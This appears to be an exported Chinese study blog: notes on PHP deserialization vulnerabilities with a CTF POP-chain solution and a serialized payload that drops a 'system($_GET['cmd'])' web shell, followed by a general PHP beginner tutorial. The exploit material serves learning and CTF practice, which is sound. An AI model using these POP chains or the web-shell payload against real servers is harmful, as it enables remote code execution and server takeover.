unserialize() 反序列化用户可控的数据时，攻击者可以通过精心构造的对象链（POP 链）触发特定的方法，实现任意代码执行（RCE）、文件读取、文件写入等攻击 例题 一 2023年 SWPU NSS 秋季招新赛 (校外赛道) - UnS3rialize ?phphighlight_file(__FILE__);error_reporting(0);class NSS public $cmd; function __invoke() echo Congratulations!!!You have learned to construct a POP chainbr/; system($this-cmd); function __wakeup() echo W4keup!!!br/; $this-cmd = echo Welcome to NSSCTF; class C public $whoami; function __get($argv) echo what do you want?; $want = $this-whoami; return $want(); class T public $sth; function __toString() echo Now you know how to use __toStringbr/There is more than one way to trigger; return $this-sth-var; class F public $user = nss; public $passwd = ctf; public $notes; function __construct($user, $passwd) $this-user = $user; $this-passwd = $passwd; function __destruct() if ($this-user === SWPU $this-passwd === NSS) echo Now you know how to use __constructbr/; echo your notes.$this-notes; else die(N0!); if (isset($_GET[ser])) $ser = unserialize(base64_decode($_GET[ser])); else echo Lets do some deserialization :); 看到在 NSS 类的 __invoke 下存在 system 执行, 需要将 NSS 类作为函数调用 在 C 类的 __get 方法将 whoami 进行调用 (这里使用了中间变量中转), 我们将其赋值为 NSS 类, 我们需要找到访问非法字段的地方 在 T 的 __toString 下访问了 sth 的 var (var 非法), 我们将其赋值为 C 类, 需要找到字符串调用的地方 在 F 中的 __destruct 存在对 note 字符串拼接, 将其赋值为 T, 发现需要user和passwd满足条件 我们构造如下反序列化链 ?phpclass NSS public $cmd = cat /flag;class C public $whoami;class T public $sth;class F public $user = SWPU; public $passwd = NSS; public $notes;$f = new F(SWPU, NSS);$t = new T();$c = new C();$nss = new NSS();$c-whoami = $nss;$t-sth = $c;$f-notes = $t;echo serialize($f); 二 源码： ?php class A public $target = test; function __wakeup() $this-target = wakeup!; function __destruct() $fp = fopen(/var/www/hello.php,w); fputs($fp,$this-target); //将 $target 写入一个文件（hello.php） fclose($fp); $a = $_GET[test]; $b = unserialize($a); echo hello.php.br/; include(./hello.php);? 构造序列化： O:1:A:1:s:7:target;s:34:?php system($_GET[\\cmd\\]); ?; payload： http://target.com/vulnerable.php?test=O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22target%22%3Bs%3A34%3A%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D 当程序执行时，__destruct() 会写入 hello.php 文件 include('./hello.php') 会执行该文件 可以通过 ?cmd= 参数执行任意系统命令 http://target.com/vulnerable.php?test=O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22target%22%3Bs%3A34%3A%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7Dcmd=whoami 参考： 一文让PHP反序列化从入门到进阶-先知社区 [CTF/Web] PHP 反序列化学习笔记-稀土掘金 PHP反序列化入门手把手详解 （推荐）php(phar)反序列化漏洞及各种绕过姿势","tags":["漏洞","PHP","反序列化","POP链"],"categories":["PHP","漏洞"]},{"title":"PHP","path":"/2025/07/09/php/","content":"PHP(超文本预处理器，服务器端脚本语言) PHP基础 PHP功能 PHP 可以生成动态页面内容 PHP 可以创建、打开、读取、写入、关闭服务器上的文件 PHP 可以收集表单数据 PHP 可以发送和接收 cookies PHP 可以添加、删除、修改您的数据库中的数据 PHP 可以限制用户访问您的网站上的一些页面 PHP 可以加密数据 通过 PHP，不再限于输出 HTML，还可以输出图像、PDF 文件，甚至 Flash 电影，还可以输出任意的文本，比如 XHTML 和 XML PHP语法 PHP 脚本可以放在文档中的任何位置。PHP 脚本以 结束，每个代码行都必须以分号结束， 有两种在浏览器输出文本的基础指令：echo 和 print，有两种注释方法：// 和 / / PHP变量 变量以 $ 符号开始，后面跟着变量的名称，变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ），必须以字母或者下划线字符开始 PHP 没有声明变量的命令，在第一次赋值时就被创建 PHP global 关键字 global 关键字用于函数内访问全局变量，在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字 PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量 global $x,$y; $y=$x+$y;//$GLOBALS[y]=$GLOBALS[x]+$GLOBALS[y]; Static 作用域 在第一次声明变量时使用 static 关键字，可以使得当一个函数完成时，某个局部变量不会被删除 即每次调用函数时，该变量将会保留着函数前一次被调用时的值。 注：该变量仍然是函数的局部变量 PHP echo 和 print 语句 echo于print区别 echo - 可以输出一个或多个字符串，且输出速度比print快 print - 只允许输出一个字符串，返回值总为 1 echo语句 ?phpecho h2PHP 很有趣!/h2;echo Hello world!br;echo 我要学 PHP!br;echo 这是一个, 字符串，, 使用了, 多个, 参数。;? ?php$txt1=学习 PHP;$txt2=RUNOOB.COM;$cars=array(Volvo,BMW,Toyota); echo $txt1;echo br;echo 在 $txt2 学习 PHP ;echo br;echo 我车的品牌是 $cars[0];? print语句 与上述例子基本一致，下例不适用print echo 这是一个, 字符串，, 使用了, 多个, 参数。; PHP EOF(heredoc) PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法 以 EOF 开始标记开始，以 EOF 结束标记结束，结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)，且在结束标记末尾要有分号 开始标记和结束标记相同，比如常用大写的 EOT、EOD、EOF 来表示，但是不只限于那几个(也可以用：JSON、HTML等)，开始标记和结束标记不在正文中出现 开始标识带单引号则不解释内嵌的变量和转义符号 在 heredoc 中，变量不需要用连接符 . 或 , 来拼接 ?phpecho EOF h1我的第一个标题/h1 p我的第一个段落。/pEOF;// 结束需要独立一行且前后不能空格? ?php$name=runoob;$a= EOF abc$name 123EOF;// 结束需要独立一行且前后不能空格echo $a;? PHP数据类型 String（字符串）Integer（整型）Float（浮点型）Boolean（布尔型）Array（数组）Object（对象）NULL（空值）Resource（资源类型） PHP字符串 一个字符串是一串字符的序列，可以将任何文本放在单引号和双引号中 PHP整型 整数是一个没有小数的数字，整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0） PHP布尔型 通常用于条件判断 PHP数组 数组可以在一个变量中存储多个值 $cars=array(Volvo,BMW,Toyota); PHP对象（难理解） 对象数据类型也可以用于存储数据 必须使用class关键字声明类对象。类是可以包含属性和方法的结构 PHP NULL值 NULL 值表示变量没有值，可以通过设置变量值为 NULL 来清空变量数据 PHP资源类型 PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用 常见资源数据类型有打开文件、数据库连接、图形画布区域等 PHP类型比较 [!IMPORTANT] 松散比较：使用两个等号 == 比较，只比较值，不比较类型。 严格比较：用三个等号 === 比较，除了比较值，也比较类型。 多种类型比较 PHP常量 常量可以用 define() 函数或 const 关键字来定义 一旦定义，其值不能改变，可以在整个脚本的任何地方都可以使用，无需使用 global 关键字 用 define() 函数 bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) **name：**必选参数，常量名称，即标志符。 **value：**必选参数，常量的值。 case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。 如 define(GREETING, 欢迎访问 Runoob.com, true); 用const 关键字 const CONSTANT_NAME = value; 如 const SITE_URL = https://www.runoob.com; 预定义常量 PHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等 PHP_VERSION：当前 PHP 解析器的版本。 PHP_OS：服务器的操作系统。 PHP_INT_MAX：最大的整数值。 E_ERROR、E_WARNING、E_PARSE 等：错误报告级别 PHP字符串变量 字符串变量用于存储并处理文本 PHP 中的字符串变量 当赋一个文本值给变量时，记得给文本值加上单引号或者双引号。 ?php$txt=Hello world!;echo $txt;? PHP 并置运算符 并置运算符 (.) 用于把两个字符串值连接起来 ?php$txt1=Hello world!;$txt2=What a nice day!;echo $txt1 . . $txt2;? 上面的代码中，我们已经使用了两次并置运算符。这是由于我们需要在两个字符串之间插入一个空格 PHP strlen() 函数 strlen() 函数返回字符串的长度（字节数） PHP strpos() 函数 strpos() 函数用于在字符串内查找一个字符或一段指定的文本。 如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。 PHP 5 String 函数 PHP运算符 算术运算符 运算符 名称 描述 实例 结果 x + y 加 x 和 y 的和 2 + 2 4 x - y 减 x 和 y 的差 5 - 2 3 x * y 乘 x 和 y 的积 5 * 2 10 x / y 除 x 和 y 的商 15 / 5 3 x % y 模（除法的余数） x 除以 y 的余数 5 % 2 10 % 8 10 % 2 1 2 0 -x 设置负数 取 x 的相反符号 ?php $x = 2; echo -$x; ? -2 ~x 取反 x 取反，按二进制位进行取反运算。运算规则：~1=-2; ~0=-1; ?php $x = 2; echo ~$x; ? -3 a . b 并置 连接两个字符串 “Hi” . “Ha” HiHa 整除运算符 intdiv()，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整） var_dump(intdiv(10, 3));会输出int(3) [!IMPORTANT] var_dump() 是一个非常有用的调试函数，用于输出变量的详细信息，包括数据类型和值 赋值运算符 运算符 等同于 描述 x = y x = y 左操作数被设置为右侧表达式的值 x += y x = x + y 加 x -= y x = x - y 减 x *= y x = x * y 乘 x /= y x = x / y 除 x %= y x = x % y 模（除法的余数） a .= b a = a . b 连接两个字符串 递增/递减运算符 运算符 名称 描述 ++ x 预递增 x 加 1，然后返回 x x ++ 后递增 返回 x，然后 x 加 1 – x 预递减 x 减 1，然后返回 x x – 后递减 返回 x，然后 x 减 1 比较运算符 运算符 名称 描述 实例 x == y 等于 如果 x 等于 y，则返回 true 5==8 返回 false x === y 绝对等于 如果 x 等于 y，且它们类型相同，则返回 true 5===“5” 返回 false x != y 不等于 如果 x 不等于 y，则返回 true 5!=8 返回 true x y 不等于 如果 x 不等于 y，则返回 true 58 返回 true x !== y 不绝对等于 如果 x 不等于 y，或它们类型不相同，则返回 true 5!==“5” 返回 true x y 大于 如果 x 大于 y，则返回 true 58 返回 false x y 小于 如果 x 小于 y，则返回 true 58 返回 true x = y 大于等于 如果 x 大于或者等于 y，则返回 true 5=8 返回 false x = y 小于等于 如果 x 小于或者等于 y，则返回 true 5=8 返回 true 逻辑运算符 运算符 名称 描述 实例 x and y 与 如果 x 和 y 都为 true，则返回 true x=6 y=3 (x 10 and y 1) 返回 true x or y 或 如果 x 和 y 至少有一个为 true，则返回 true x=6 y=3 (x6 or y5) 返回 true x xor y 异或 如果 x 和 y 有且仅有一个为 true，则返回 true x=6 y=3 (x6 xor y3) 返回 false x y 与 如果 x 和 y 都为 true，则返回 true x=6 y=3 (x 10 y 1) 返回 true x || y 或 如果 x 和 y 至少有一个为 true，则返回 true x=6 y=3 (x5 || y5) 返回 false ! x 非 如果 x 不为 true，则返回 true x=6 y=3 !(x==y) 返回 true 数组运算符 运算符 名称 描述 x + y 集合 x 和 y 的集合 x == y 相等 如果 x 和 y 具有相同的键/值对，则返回 true x === y 恒等 如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true x != y 不相等 如果 x 不等于 y，则返回 true x y 不相等 如果 x 不等于 y，则返回 true x !== y 不恒等 如果 x 不等于 y，则返回 true 三元运算符 (expr1) ? (expr2) : (expr3) 以下实例中通过判断 $_GET 请求中含有 user 值，如果有返回 $_GET[‘user’]，否则返回 nobody： ?php// 普通写法$username = isset($_GET[user]) ? $_GET[user] : nobody;echo $username, PHP_EOL; // PHP 5.3+ 版本写法$username = $_GET[user] ?: nobody;echo $username, PHP_EOL;// PHP 7+ 版本写法$username = $_GET[user] ?? nobody;echo $username, PHP_EOL;? 注：PHP_EOL 是一个换行符 组合比较符(PHP7+) 符号为 =。组合比较运算符可以轻松实现两个变量的比较，不仅限于数值类数据的比较 $c = $a = $b; 如果 $a b∗∗,则∗∗b**, 则 **b∗∗,则∗∗c 的值为 1。 如果 $a == b∗∗,则∗∗b**, 则 **b∗∗,则∗∗c 的值为 0。 如果 $a b∗∗,则∗∗b**, 则 **b∗∗,则∗∗c 的值为 -1。 运算符优先级 下表按照优先级从高到低列出了运算符 说明：左 ＝ 从左到右，右 ＝ 从右到左 结合方向 运算符 附加信息 无 clone new clone 和 new 左 [ array() 右 ++ – ~ (int) (float) (string) (array) (object) (bool) @ 类型和递增／递减 无 instanceof 类型 右 ! 逻辑运算符 左 * / % 算术运算符 左 + – . 算术运算符和字符串运算符 左 位运算符 无 == != === !== 比较运算符 左 位运算符和引用 左 ^ 位运算符 左 | 位运算符 左 逻辑运算符 左 || 逻辑运算符 左 ? : 三元运算符 右 = += -= *= /= .= %= = |= ^= = = = 赋值运算符 左 and 逻辑运算符 左 xor 逻辑运算符 左 or 逻辑运算符 左 , 多处用到 ?php// 优先级： = and// 优先级： || = or $a = 3;$b = false;$c = $a or $b;var_dump($c); // 这里的 $c 为 int 值3，而不是 boolean 值 true；输出int(3)$d = $a || $b;var_dump($d); //这里的 $d 就是 boolean 值 true ;输出bool(true)? PHP 条件语句 if 语句 - 在条件成立时执行代码 if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码 if…elseif…else 语句 - 在若干条件之一成立时执行一个代码块 switch 语句 - 在若干条件之一成立时执行一个代码块 PHP数组 在 PHP 中，array() 函数用于创建数组 ?php$cars=array(Volvo,BMW,Toyota);echo I like . $cars[0] . , . $cars[1] . and . $cars[2] . .;? 获取数组的长度 count() 函数用于返回数组的长度（元素的数量） 遍历数值数组 遍历并打印数值数组中的所有值，您可以使用 for 循环 PHP 关联数组 关联数组是使用分配给数组的指定的键的数组 ?php$age=array(Peter=35,Ben=37,Joe=43);echo Peter is . $age[Peter] . years old.;? 遍历关联数组 遍历并打印关联数组中的所有值，您可以使用 foreach 循环 ?php$age=array(Peter=35,Ben=37,Joe=43); foreach($age as $x=$x_value) echo Key= . $x . , Value= . $x_value; echo br;? [!IMPORTANT] foreach 在 PHP 中，foreach 循环是一种专门用于遍历数组或对象的结构 相比于 for 或 while 循环，foreach 能更自然地处理复杂数据结构，如关联数组或对象 基本语法 遍历数组 foreach ($array as $value) // 循环体 $array：需要遍历的数组。 $value：当前循环中数组的值。 遍历数组的键值对 foreach ($array as $key = $value) // 循环体 $key：当前元素的键。 $value：当前元素的值。 实例 简单数组 ?php$x=array(Google,Runoob,Taobao);foreach ($x as $value) echo $value . PHP_EOL;? 关联数组 ?php$x=array(1=Google, 2=Runoob, 3=Taobao);foreach ($x as $key = $value) echo key 为 . $key . ，对应的 value 为 . $value . PHP_EOL;? 嵌套数组 ?php$users = [ [name = John, age = 30], [name = Jane, age = 25], [name = Doe, age = 40]];foreach ($users as $user) foreach ($user as $key = $value) echo $key: $value, ; echo ;? 遍历对象 ?phpclass Car public $brand = Toyota; public $model = Corolla; public $year = 2022;$car = new Car();foreach ($car as $property = $value) echo $property: $value ;? 数组排序 数组中的元素可以按字母或数字顺序进行降序或升序排列 sort() 对数组进行升序排列 rsort() 对数组进行降序排列 asort() 根据数组的值，对关联数组进行升序排列 ?php$age=array(Peter=35,Ben=37,Joe=43);asort($age);? arsort() 根据数组的值，对关联数组进行降序排列 ksort() 根据数组的键，对关联数组进行升序排列 krsort() 根据数组的键，对关联数组进行降序排列 PHP 超级全局变量 超级全局变量在一个脚本的全部作用域中都可用 PHP 超级全局变量列表: $GLOBALS $_SERVER $_REQUEST $_POST $_GET $_FILES $_ENV $_COOKIE $_SESSION PHP $GLOBALS $GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 PHP $_SERVER $_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。 PHP $_REQUEST PHP $_REQUEST 用于收集HTML表单提交的数据 PHP $_POST PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：method=“post”。 PHP $_GET PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：method=“get” $_GET 也可以收集URL中发送的数据 假定我们有一个包含参数的超链接HTML页面： htmlbodya href=test_get.php?subject=PHPweb=runoob.comTest $GET/a/body/html 当用户点击链接 “Test $GET”, 参数 “subject” 和 “web” 将发送至test_get.php,你可以在 “test_get.php” 文件中使用 $_GET 变量来获取这些数据。以下为 “test_get.php” 文件的代码: html body ?php echo Study . $_GET[subject] . @ . $_GET[web]; ? /body /html PHP循环 while - 只要指定的条件成立，则循环执行代码块 do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环 for - 循环执行代码块指定的次数 foreach - 根据数组中每个元素来循环代码块 PHP面向对象（难理解） 面向对象（Object-Oriented，简称 OO）是一种编程思想和方法，它将程序中的数据和操作数据的方法封装在一起，形成对象，并通过对象之间的交互和消息传递来完成程序的功能 关键概念 概念 说明 类（class） 对象的模板，定义属性和方法 对象（object） 通过类实例化的具体对象 属性（property） 类中的变量（也叫成员变量） 方法（method） 类中的函数 构造方法（__construct） 实例化对象时自动执行 析构方法（__destruct） 对象销毁时自动执行 继承（extends） 子类继承父类的方法和属性 多态（polymorphism） 不同类可以实现相同的方法 封装（encapsulation） 限制属性和方法的访问权限 接口（interface） 定义类必须实现的方法 抽象类（abstract） 不能实例化的类，必须被子类继承 类（class） class Person // 定义属性：属性是类中定义的变量，用于存储对象的状态 public $name; public $age; // 构造方法 public function __construct($name, $age) $this-name = $name; $this-age = $age; // 定义方法：方法是类中定义的函数，用于定义对象的行为 public function sayHello() return Hello, my name is . $this-name; 类是对象的模板，定义属性和方法，类使用 class 关键字后加上类名定义，类名后的一对大括号({})内可以定义变量和方法，类的变量使用 var 来声明, 变量也可以初始化值 [!CAUTION] 类，对象，当前对象的关系 类 是一种模板或蓝图。比如，class Car ... 是一个汽车的模板。 对象 是从类生成的具体实例。比如，$car1 = new Car(); 是一辆具体的汽车。 当前对象 是某一时刻你正在操作的对象。如果你正在对 $car1 调用方法，那么 $car1 就是当前对象，$this 就是指当前对象，在方法里用 $this 来访问或修改它的属性和方法。 对象（object） 对象是类的实例。通过 new 关键字可以创建一个类的实例。 $person1 = new Person(Alice, 25);echo $person1-sayHello(); // 输出: Hello, my name is Alice 访问控制/封装（encapsulation） PHP 提供 3 种访问控制属性或方法的修饰符： 修饰符 作用 public 公开，类内外都能访问 private 私有，只有定义它的类内部能访问，在子类中也无法直接访问，不能重定义 protected 受保护，类内部和子类能访问，类的外部无法直接访问 属性的访问控制 类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有 方法的访问控制 类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有 继承（extends） 子类（Child Class） 可以继承 父类（Parent Class） 的方法和属性，用 extends 关键字实现，PHP 不支持多继承 class Animal public $name; public function __construct($name) $this-name = $name; public function speak() return 🗣 叫声未知; class Dog extends Animal public function speak() return 🐶 汪汪！; $dog = new Dog(旺财);echo $dog-speak(); // 🐶 汪汪！ Dog 继承 Animal，但重写了 speak() 方法，让狗狗可以发出「汪汪」的叫声 方法重写 允许子类重写（覆盖）父类的方法 关键点 子类 继承 父类 子类 使用相同的方法名 覆盖父类的方法 方法的 访问权限 放宽（protected 方法可以被 public 重写） 基本用法 class Animal public function speak() return 🐾 这是一个动物的声音; class Dog extends Animal public function speak() return 🐶 汪汪！; $dog = new Dog();echo $dog-speak(); // 🐶 汪汪！ 子类 Dog 重写了 speak() 方法，不再继承父类 Animal 的默认实现 parent:: 关键字调用父类方法 如果子类需要调用父类的同名方法，可以使用 parent::方法名() class Animal public function speak() return 🐾 这是一个动物的声音; class Dog extends Animal public function speak() return parent::speak() . 🐶 但狗会汪汪叫！; $dog = new Dog();echo $dog-speak(); // 🐾 这是一个动物的声音 🐶 但狗会汪汪叫！ parent::speak() 调用了父类 Animal 的 speak()，然后追加了 🐶 但狗会汪汪叫！ Final 关键字 用于防止继承（类）和方法重写（方法），不能用于属性 多态（polymorphism） 不同的类可以用相同的方法名，但实现不同的功能 class Animal public function makeSound() return 🐾 这是一个动物的声音; class Dog extends Animal public function makeSound() return 🐶 汪汪！; class Cat extends Animal public function makeSound() return 🐱 喵喵！; // 创建对象$dog = new Dog();$cat = new Cat();echo $dog-makeSound(); // 🐶 汪汪！echo $cat-makeSound(); // 🐱 喵喵！ 不同的类（Dog 和 Cat）继承了 Animal，但重写了 makeSound() 方法，实现不同的功能 抽象类（abstract） 抽象类只适合作为「模板」不能被实例化（创建对象），必须由子类继承并实现其方法 abstract class Shape abstract public function area();class Circle extends Shape public $radius; public function __construct($radius) $this-radius = $radius; public function area() return pi() * pow($this-radius, 2); $c = new Circle(5);echo $c-area(); // 78.54 Shape 是抽象类，不能直接创建对象，Circle 继承它并实现 area() 方法 接口（interface） 接口 定义了「必须实现」的方法，确保不同类有相同的行为 接口是通过 interface 关键字来定义的，接口中定义的所有方法都必须是公有 要实现一个接口，使用 implements 操作符 //定义接口interface Logger public function log($message);//实现接口class FileLogger implements Logger public function log($message) echo 📁 记录日志到文件： . $message; $logger = new FileLogger();$logger-log(系统错误); // 📁 记录日志到文件：系统错误 静态成员（Static） 静态方法和属性属于类本身，不需要实例化就可直接访问 静态属性不能通过一个类已实例化的对象来访问（但静态方法可以） ?phpclass Math public static $pi = 3.1416; public static function square($num) return $num * $num; echo Math::$pi; // 3.1416echo Math::square(5); // 25? 静态成员 用 :: 访问 魔术方法 魔术方法 是 PHP 预定义的特殊方法 方法 作用 __construct() 构造函数，创建对象时自动调用 __destruct() 析构函数，销毁对象时调用 __get($name) 访问不存在的属性 __set($name, $value) 给不存在的属性赋值 __call($name, $arguments) 调用不存在的方法 __toString() 对象被当作字符串时调用 ?phpclass MyDestructableClass function __construct() print 构造函数 ; $this-name = MyDestructableClass; function __destruct() print 销毁 . $this-name . ; $obj = new MyDestructableClass();? 输出为 构造函数销毁 MyDestructableClass PHP表单 PHP表单和用户输入 PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入 PHP 表单处理 当处理 HTML 表单时，PHP 能把来自 HTML 页面中的表单元素自动变成可供 PHP 脚本使用 PHP 获取下拉菜单的数据 PHP 下拉菜单单选 以下实例我们设置了下拉菜单三个选项，表单使用 GET 方式获取数据，action 属性值为空表示提交到当前脚本，我们可以通过 select 的 name 属性获取下拉菜单的值： ?php$q = isset($_GET[q])? htmlspecialchars($_GET[q]) : ;if($q) if($q ==RUNOOB) echo 菜鸟教程brhttp://www.runoob.com; else if($q ==GOOGLE) echo Google 搜索brhttp://www.google.com; else if($q ==TAOBAO) echo 淘宝brhttp://www.taobao.com; else ?form action= method=get select name=q option value=选择一个站点:/option option value=RUNOOBRunoob/option option value=GOOGLEGoogle/option option value=TAOBAOTaobao/option /select input type=submit value=提交 /form?php? [!IMPORTANT] htmlspecialchars($_GET['q']) 是一种防止 跨站脚本攻击XSS 的安全措施 htmlspecialchars()函数会对用户输入的数据进行转义处理，将特殊的 HTML 字符转换为 HTML 实体，以防止它们被解释为 HTML 或 JavaScript 代码 将以下字符转换为 HTML 实体： → amp; → lt; → gt; → quot; ' → #039;（仅在使用 ENT_QUOTES 时） ?php// 假设 URL 为：http://example.com/?q=scriptalert(XSS)/script$q = $_GET[q];echo 您输入的内容是：$q;//输出：您输入的内容是：scriptalert(XSS)/script ?php// 假设 URL 为：http://example.com/?q=scriptalert(XSS)/script$q = htmlspecialchars($_GET[q]);echo 您输入的内容是：$q;//输出：您输入的内容是：lt;scriptgt;alert(XSS)lt;/scriptgt; [!NOTE] php与html切换 if (条件) // 执行一些 PHP 代码 else ? !-- 这里是 HTML 代码 -- ?php PHP 下拉菜单多选 如果下拉菜单是多选的（ multiple=“multiple”），我们可以通过将设置 select name=“q[]” 以数组的方式获取，以下使用 POST 方式提交 ?php$q = isset($_POST[q])? $_POST[q] : ;if(is_array($q)) $sites = array( RUNOOB = 菜鸟教程: http://www.runoob.com, GOOGLE = Google 搜索: http://www.google.com, TAOBAO = 淘宝: http://www.taobao.com, ); foreach($q as $val) // PHP_EOL 为常量，用于换行 echo $sites[$val] . PHP_EOL; else ?form action= method=post select multiple=multiple name=q[] option value=选择一个站点:/option option value=RUNOOBRunoob/option option value=GOOGLEGoogle/option option value=TAOBAOTaobao/option /select input type=submit value=提交 /form?php? 单选按钮表单 PHP 单选按钮表单中 name 属性的值是一致的，value 值是不同的 ?php$q = isset($_GET[q])? htmlspecialchars($_GET[q]) : ;if($q) if($q ==RUNOOB) echo 菜鸟教程brhttp://www.runoob.com; else if($q ==GOOGLE) echo Google 搜索brhttp://www.google.com; else if($q ==TAOBAO) echo 淘宝brhttp://www.taobao.com; else ?form action= method=get input type=radio name=q value=RUNOOB /Runoob input type=radio name=q value=GOOGLE /Google input type=radio name=q value=TAOBAO /Taobao input type=submit value=提交/form?php? checkbox 复选框 PHP checkbox 复选框可以选择多个值 ?php$q = isset($_POST[q])? $_POST[q] : ;if(is_array($q)) $sites = array( RUNOOB = 菜鸟教程: http://www.runoob.com, GOOGLE = Google 搜索: http://www.google.com, TAOBAO = 淘宝: http://www.taobao.com, ); foreach($q as $val) // PHP_EOL 为常量，用于换行 echo $sites[$val] . PHP_EOL; else ?form action= method=post input type=checkbox name=q[] value=RUNOOB Runoobbr input type=checkbox name=q[] value=GOOGLE Googlebr input type=checkbox name=q[] value=TAOBAO Taobaobr input type=submit value=提交/form?php? PHP 表单验证 $_SERVER[“PHP_SELF”] 变量 是一个超全局变量，用于返回当前执行脚本的文件路径（相对于网站根目录） 通常用于：表单的自提交（self-submitting form）和动态生成页面链接。 基本使用 ?phpecho $_SERVER[PHP_SELF];? 假设访问路径：URL: http://www.example.com/test/form.php 输出结果（$_SERVER[PHP_SELF] 的值为）： /test/form.php 表单自提交 通过 $_SERVER[PHP_SELF] 实现表单提交到当前页面 ?phpif ($_SERVER[REQUEST_METHOD] == POST) $name = htmlspecialchars($_POST[name]); echo 你好, $name!;?form method=post action=?php echo htmlspecialchars($_SERVER[PHP_SELF]); ? 姓名: input type=text name=name input type=submit value=提交/form htmlspecialchars($_SERVER[PHP_SELF])避免XSS 使用 PHP 验证表单数据 首先我们对用户所有提交的数据都通过 PHP 的 htmlspecialchars() 函数处理。 当我们使用 htmlspecialchars() 函数时，在用户尝试提交以下文本域: scriptlocation.href(http://www.runoob.com)/script 该代码将不会被执行，因为它会被保存为HTML转义代码，如下所示： lt;scriptgt;location.href(http://www.runoob.com)lt;/scriptgt; 以上代码是安全的，可以正常在页面显示或者插入邮件中。 当用户提交表单时，我们将做以下两件事情： 使用 PHP trim() 函数去除用户输入数据中不必要的字符 (如：空格，tab，换行)。 使用PHP stripslashes()函数去除用户输入数据中的反斜杠 (\\) ?php// 定义变量并默认设置为空值$name = $email = $gender = $comment = $website = ; if ($_SERVER[REQUEST_METHOD] == POST) $name = test_input($_POST[name]); $email = test_input($_POST[email]); $website = test_input($_POST[website]); $comment = test_input($_POST[comment]); $gender = test_input($_POST[gender]); function test_input($data) $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data); return $data;? PHP 表单 - 必需字段 PHP - 必需字段 字段 验证规则 名字 必需。 + 只能包含字母和空格 E-mail 必需。 + 必需包含一个有效的电子邮件地址（包含@“和”.） 网址 可选。 如果存在，它必需包含一个有效的URL 备注 可选。多行字段（文本域）。 性别 必需。必需选择一个。 ?php// 定义变量并默认设为空值$nameErr= ;$name= ;if ($_SERVER[REQUEST_METHOD] == POST) if (empty($_POST[name])) $nameErr = 名字是必需的。; else $name = test_input($_POST[name]); ? PHP - 显示错误信息 form method=post action=?php echo htmlspecialchars($_SERVER[PHP_SELF]);? 名字: input type=text name=name span class=error* ?php echo $nameErr;?/span brbr input type=submit name=submit value=Submit /form [!IMPORTANT] span class=error* ?php echo $nameErr;?/span 是用来在 HTML 页面中动态显示表单验证的错误提示消息的 如果 $nameErr 为空，则此部分不会显示内容。 如果 $nameErr 包含错误消息，会在页面中显示，例如：名字是必填项 PHP 表单 - 验证邮件和URL PHP - 验证名称 以下代码将通过简单的方式来检测 name 字段是否包含字母和空格，如果 name 字段值不合法，将输出错误信息： $name = test_input($_POST[name]);if (!preg_match(/^[a-zA-Z ]*$/,$name)) $nameErr = 只允许字母和空格; [!IMPORTANT] preg_match 进行正则表达式匹配 int preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] ) 正则表达式 preg_replace()可用于删除所有 HTML 标签 ?php$html = h1Title/h1pContent/p;$plainText = preg_replace(/[^]+/, , $html); // 替换所有 HTML 标签echo $plainText; // 输出 TitleContent? PHP - 验证邮件 $email = test_input($_POST[email]);if (!preg_match(/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/,$email)) $emailErr = 非法邮箱格式; \\w匹配任意字母、数字或下划线（[a-zA-Z0-9_]） PHP - 验证 URL 以下代码将检测URL地址是否合法 (以下正则表达式运行URL中含有破折号:“-”)， 如果 URL 地址不合法，将输出错误信息 $website = test_input($_POST[website]);if (!preg_match(/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+@#\\/%?=~_|!:,.;]*[-a-z0-9+@#\\/%=~_|]/i,$website)) $websiteErr = 非法的 URL 的地址; PHP GET和GET和GET和POST变量 $_GET 变量 预定义的 $_GET 变量用于收集来自 method=“get” 的表单中的值 从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制 在 HTML 表单中使用 method=“get” 时，所有的变量名和值都会显示在 URL 中，，因此可以在收藏夹中收藏该页面，但在发送密码或其他敏感信息时，不应该使用这个方法 http://www.runoob.com/welcome.php?fname=Runoobage=3 $_POST 变量 预定义的 $_POST 变量用于收集来自 method=“post” 的表单中的值 从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制 注释：然而，默认情况下，POST 方法的发送信息的量最大值为 8 MB（可通过设置 php.ini 